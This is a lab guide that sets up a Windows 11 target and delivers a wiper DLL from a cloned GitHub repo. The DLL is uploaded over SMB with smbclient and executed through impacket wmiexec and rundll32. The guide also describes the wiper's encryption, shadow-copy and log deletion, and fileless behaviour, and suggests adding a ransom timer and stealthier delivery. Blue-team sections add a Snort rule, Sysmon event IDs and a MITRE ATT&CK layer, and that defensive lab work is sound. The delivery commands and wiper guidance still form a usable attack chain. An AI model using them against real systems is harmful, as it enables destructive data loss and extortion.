

## 🧱 1. LAB STRUCTURE OVERVIEW

| Role       | System               | IP Example               | Key Tools                                      |
| ---------- | -------------------- | ------------------------ | ---------------------------------------------- |
| Attacker   | Win 11 + WSL2 Ubuntu | `192.168.1.100`          | `Impacket`, `smbclient`, `rundll32`, `wmiexec` |
| Target     | Windows 11 VM        | `192.168.1.101`          | `Sysmon`, `Wireshark`, `Snort`, `Defender`     |
| Shared SMB | Target file share    | `\\192.168.1.101\shared` | DLL drop location                              |

---

## 🔧 2. ATTACKER SETUP (WSL2 Ubuntu)

### ➤ Install Dependencies

```bash
sudo apt update && sudo apt install -y smbclient python3-pip git crackmapexec wine
pip install impacket
```

### ➤ Clone the Payload Repo (NSFW)

```bash
git clone --branch purpleboi https://github.com/P1rat3R00t/NSFW ~/nsfw_lab
```

> 💡 The DLL payload (`nsfw.dll`) is located in `~/nsfw_lab/bin/nsfw.dll`.

---

## 📁 3. TARGET SYSTEM SETUP (Windows 11 VM)

### ➤ A. Create and Share a Folder

1. Make a folder: `C:\shared`
2. Right-click → Properties → Sharing tab → Advanced Sharing → Share as `shared`.
3. Set permissions: Allow **Everyone** to read/write.

### ➤ B. Enable Remote Access (for WMI or WinRM)

* Enable PowerShell remoting:

```powershell
Enable-PSRemoting -Force
```

### ➤ C. Install Sysmon for Logging

* Download: [https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)
* Config:

```powershell
curl -LJO https://raw.githubusercontent.com/SwiftOnSecurity/sysmon-config/master/sysmonconfig-export.xml
Sysmon64.exe -accepteula -i sysmonconfig-export.xml
```

---

## 📡 4. DLL TRANSFER AND EXECUTION

### ➤ A. Upload DLL via SMB

```bash
smbclient //192.168.1.101/shared -N -c "put ~/nsfw_lab/bin/nsfw.dll"
```

> **T1135 – Network Share Discovery**
> **T1021.002 – SMB/Windows Admin Shares**

### ➤ B. Trigger DLL via WMIExec

```bash
python3 -m impacket.examples.wmiexec Administrator@192.168.1.101 "rundll32 \\192.168.1.101\shared\nsfw.dll,EntryPoint"
```

> **T1218.011 – Rundll32 Execution**
> **T1112 – Registry Modification** (if persistence logic is added)

---

## 🔍 5. DEFENSIVE MONITORING (BLUE TEAM)

### ➤ A. Install Snort (Optional)

* Download: [https://www.snort.org/downloads](https://www.snort.org/downloads)
* Example rule for DLL over SMB:

```snort
alert tcp any any -> any 445 (msg:"DLL Upload Detected over SMB"; content:".dll"; nocase; sid:1000001; rev:1;)
```

### ➤ B. Install Wireshark

* Download: [https://www.wireshark.org/download.html](https://www.wireshark.org/download.html)
* Filter traffic:

```
smb || dns || http || tcp.port == 445
```

### ➤ C. Monitor with Sysmon

* View logs: `Event Viewer > Applications and Services Logs > Microsoft > Windows > Sysmon > Operational`
* Key Event IDs:

  * **1** – Process Creation
  * **3** – Network Connection
  * **7** – Image Load (DLL)
  * **11** – File Created
  * **13** – Registry Modification

### ➤ D. Enable Script Block Logging

```powershell
Set-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging -Name EnableScriptBlockLogging -Value 1
```

---

## 💥 6. WIPER PAYLOAD BEHAVIOR (DLL)

* Memory-resident execution
* XTS-AES encryption (DiskCryptor base)
* PRNG overwrite for redundancy
* Shadow copy and log deletion (if triggered)
* No disk footprint post-execution

---

## 🧠 7. MITRE ATT\&CK NAVIGATOR LAYER

Create a `.json` file and import at [https://mitre-attack.github.io/attack-navigator/](https://mitre-attack.github.io/attack-navigator/)

```json
{
  "version": "4.3",
  "name": "NSFW Fileless Wiper",
  "domain": "enterprise-attack",
  "description": "Fileless DLL attack over SMB using rundll32 and memory-only encryption.",
  "techniques": [
    { "techniqueID": "T1135", "tactic": "discovery", "score": 1 },
    { "techniqueID": "T1021.002", "tactic": "lateral-movement", "score": 1 },
    { "techniqueID": "T1218.011", "tactic": "defense-evasion", "score": 1 },
    { "techniqueID": "T1485", "tactic": "impact", "score": 1 },
    { "techniqueID": "T1112", "tactic": "persistence", "score": 0.5 }
  ]
}
```

---

## 🔐 8. OPTIONAL EXTENSIONS

* ✅ Add ransom timer + note in the DLL (PowerShell or .NET triggered)
* ✅ Integrate logging into ELK/Splunk/OpenSearch
* ✅ Deploy via `.lnk` or `regsvr32` for stealth variants
* ✅ Monitor entropy shifts on disk via custom scripts


